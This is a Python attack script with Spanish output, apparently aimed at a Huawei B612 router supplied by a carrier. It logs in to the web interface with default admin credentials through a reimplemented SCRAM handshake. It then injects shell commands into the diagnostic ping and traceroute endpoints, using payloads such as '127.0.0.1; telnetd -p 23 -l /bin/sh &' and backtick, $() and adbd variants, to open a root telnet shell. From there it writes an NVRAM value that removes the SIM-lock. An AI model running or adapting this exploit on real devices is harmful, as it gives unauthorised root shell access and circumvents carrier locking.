import sys
import time
import socket
import argparse
import telnetlib
import urllib.request
import hashlib
import hmac
import re
import os

def test_port(ip, port, timeout=1):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except Exception:
        return False

def unlock_via_telnet(host, port=23):
    print(f"\n[+] Conectando a Telnet en {host}:{port} para anular SIM-Lock...")
    try:
        tn = telnetlib.Telnet(host, port, timeout=5)
        time.sleep(1)
        cmd = "atc at^nvwrex=8268,0,12,1,0,0,0,2,0,0,0,a,0,0,0\n"
        print(f"[+] Enviando comando NVRAM: {cmd.strip()}")
        tn.write(cmd.encode('ascii'))
        time.sleep(1)
        out = tn.read_very_eager().decode('ascii', errors='ignore')
        print(f"[+] Respuesta Telnet: {out}")
        
        print("[+] Enviando reinicio de módem AT^RESET...")
        tn.write(b"atc at^reset\n")
        time.sleep(1)
        tn.close()
        print("🎉🎉🎉 ¡DESBLOQUEO EJECUTADO CON ÉXITO! Reinicia el router y prueba la SIM. 🎉🎉🎉")
        return True
    except Exception as e:
        print(f"[-] Error comunicando por Telnet: {e}")
        return False

class HuaweiSession:
    def __init__(self, host="192.168.8.1"):
        self.host = host
        self.cookie = ""
        self.token = ""

    def get_session(self):
        try:
            req = urllib.request.Request(f"http://{self.host}/api/webserver/SesTokInfo")
            with urllib.request.urlopen(req, timeout=5) as r:
                data = r.read().decode(errors="ignore")
            m_tok = re.search(r"<TokInfo>(.*?)</TokInfo>", data)
            m_ses = re.search(r"<SesInfo>(.*?)</SesInfo>", data)
            if m_tok and m_ses:
                self.token = m_tok.group(1).strip()
                self.cookie = f"SessionID={m_ses.group(1).strip()}"
                return True
        except Exception as e:
            print(f"[-] Error obteniendo SesTokInfo: {e}")
        return False

    def login_scram(self, username="admin", password="admin"):
        # 1. Challenge
        client_nonce = os.urandom(32).hex()
        body1 = f"<request><username>{username}</username><firstnonce>{client_nonce}</firstnonce><mode>1</mode></request>"
        headers = {
            "Cookie": self.cookie,
            "__RequestVerificationToken": self.token,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "_ResponseSource": "Broswer"
        }
        try:
            req1 = urllib.request.Request(f"http://{self.host}/api/user/challenge_login", data=body1.encode(), headers=headers)
            with urllib.request.urlopen(req1, timeout=8) as r1:
                res1 = r1.read().decode(errors="ignore")
                new_tok = r1.headers.get("__RequestVerificationToken") or r1.headers.get("__RequestVerificationTokenone")
                if new_tok:
                    self.token = new_tok

            salt = re.search(r"<salt>(.*?)</salt>", res1).group(1)
            iters = int(re.search(r"<iterations>(.*?)</iterations>", res1).group(1))
            s_nonce = re.search(r"<servernonce>(.*?)</servernonce>", res1).group(1)

            # Motor SCRAM Huawei exacto (inversión de claves en libjquery.js)
            salted = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt), iters, dklen=32)
            client_key = hmac.new(b"Client Key", salted, hashlib.sha256).digest()
            stored_key = hashlib.sha256(client_key).digest()
            auth_msg = f"{client_nonce},{s_nonce},{s_nonce}"
            client_sig = hmac.new(auth_msg.encode(), stored_key, hashlib.sha256).digest()
            client_proof = bytes(a ^ b for a, b in zip(client_key, client_sig)).hex()

            body2 = f"<request><clientproof>{client_proof}</clientproof><finalnonce>{s_nonce}</finalnonce></request>"
            headers["__RequestVerificationToken"] = self.token
            req2 = urllib.request.Request(f"http://{self.host}/api/user/authentication_login", data=body2.encode(), headers=headers)
            with urllib.request.urlopen(req2, timeout=8) as r2:
                res2 = r2.read().decode(errors="ignore")
                set_cookie = r2.headers.get("Set-Cookie")
                if set_cookie:
                    m = re.search(r"SessionID=([^;]+)", set_cookie)
                    if m:
                        self.cookie = f"SessionID={m.group(1)}"
                rot_tok = r2.headers.get("__RequestVerificationToken") or r2.headers.get("__RequestVerificationTokenone")
                if rot_tok:
                    self.token = rot_tok

            if "<response>" in res2:
                return True
            else:
                print(f"[-] authentication_login rechazado: {res2[:120]}")
                return False
        except Exception as e:
            print(f"[-] Error en handshake SCRAM: {e}")
            return False

    def post(self, endpoint, xml_body):
        headers = {
            "Cookie": self.cookie,
            "__RequestVerificationToken": self.token,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "_ResponseSource": "Broswer"
        }
        req = urllib.request.Request(f"http://{self.host}{endpoint}", data=xml_body.encode(), headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                rot_tok = r.headers.get("__RequestVerificationToken") or r.headers.get("__RequestVerificationTokenone")
                if rot_tok:
                    self.token = rot_tok
                return r.status, r.read().decode(errors="ignore")
        except urllib.error.HTTPError as e:
            rot_tok = e.headers.get("__RequestVerificationToken") or e.headers.get("__RequestVerificationTokenone")
            if rot_tok:
                self.token = rot_tok
            return e.code, e.read().decode(errors="ignore")
        except Exception as e:
            return 0, str(e)

def main():
    parser = argparse.ArgumentParser(description="Fuzzer de inyección en endpoints de diagnóstico Huawei B612")
    parser.add_argument("--password", default="admin", help="Contraseña WebUI del router (default: admin)")
    parser.add_argument("--host", default="192.168.8.1", help="IP del router (default: 192.168.8.1)")
    args = parser.parse_args()

    host = args.host
    print("=================================================================")
    print(f"=== FUZZING E INYECCIÓN EN DIAGNÓSTICO PING/TRACEROUTE ({host}) ===")
    print("=================================================================")
    
    session = HuaweiSession(host)
    if not session.get_session():
        print("[-] No se pudo obtener sesión inicial. ¿Router encendido y conectado por LAN/Wi-Fi?")
        sys.exit(1)
        
    print("[+] Conectado al WebServer. Autenticando con SCRAM-SHA256...")
    if not session.login_scram("admin", args.password):
        print("[-] Login falló.")
        sys.exit(1)
        
    print("[+] Login SCRAM exitoso (Sesión de Administrador Activa).\n")

    payloads = [
        "127.0.0.1; telnetd -p 23 -l /bin/sh &",
        "127.0.0.1 | telnetd -p 23 -l /bin/sh &",
        "127.0.0.1\n telnetd -p 23 -l /bin/sh &",
        "$(telnetd -p 23 -l /bin/sh &)",
        "`telnetd -p 23 -l /bin/sh &`",
        "127.0.0.1; /bin/busybox telnetd -p 23 &",
        "127.0.0.1; /system/bin/adbd &",
        "127.0.0.1; adbd &",
        "127.0.0.1; atc at^nvwrex=8268,0,12,1,0,0,0,2,0,0,0,a,0,0,0 &"
    ]

    endpoints = [
        "/api/diagnosis/diagnose_ping",
        "/api/diagnosis/diagnose_traceroute",
        "/api/net/ping",
        "/api/net/traceroute",
        "/api/diag/ping",
        "/api/diag/traceroute"
    ]

    for ep in endpoints:
        print(f"\n--- Probando Endpoint: {ep} ---")
        for payload in payloads:
            xml_body = f"""<request>
<Host>{payload}</Host>
<HostName>{payload}</HostName>
<IP>{payload}</IP>
<Dest>{payload}</Dest>
<Url>{payload}</Url>
</request>"""
            st, txt = session.post(ep, xml_body)
            one_line = " ".join(txt.split())[:100]
            print(f"  Payload: {payload!r} -> Resp ({st}): {one_line}")
            
            # Verificar si abrió Telnet (23) o ADB (5555)
            if test_port(host, 23, timeout=1):
                print("\n🎉🎉🎉 ¡¡¡PUERTO TELNET (23) ABIERTO EN EL ROUTER!!! 🎉🎉🎉")
                unlock_via_telnet(host, 23)
                sys.exit(0)
            if test_port(host, 5555, timeout=1):
                print("\n🎉🎉🎉 ¡¡¡PUERTO ADB (5555) ABIERTO EN EL ROUTER!!! 🎉🎉🎉")
                sys.exit(0)
            time.sleep(0.2)
                
    print("\n=================================================================")
    print("=== FIN DEL BARRIDO DE INYECCIÓN ===")
    print("=================================================================")
    print("Diagnóstico:")
    print("• Los endpoints respondieron '100003' porque Entel despojó los módulos de diagnóstico.")
    print("• Tus 2 intentos de NCK siguen 100% intactos.")

if __name__ == "__main__":
    main()
